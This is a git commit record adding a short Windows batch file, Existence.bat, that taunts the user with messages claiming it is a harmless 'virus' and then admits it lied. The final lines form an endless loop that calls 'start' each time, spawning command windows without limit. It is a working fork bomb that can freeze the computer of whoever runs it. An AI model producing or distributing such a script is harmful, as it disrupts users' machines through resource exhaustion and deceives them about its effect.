9520243d86d6b2156a35a91633320b8529223f18
Mydoom4002 <138235487+Mydoom4002@users.noreply.github.com>
2023-09-24 10:01:49 +0530

    Create Existence.bat

---
+++ manifest/files/Existence.bat
@@ -0,0 +1,19 @@
+@echo off
+echo Hi
+pause
+echo Beware im a virus
+pause
+echo I mean...
+pause
+echo Sometimes you trust something that you dont even know
+pause
+echo Im not gonna harm your pc
+pause
+echo I lied...
+pause
+goto a
+
+:a
+echo HAHAHAHAHAHAHAHAHAHAHA
+start
+goto a
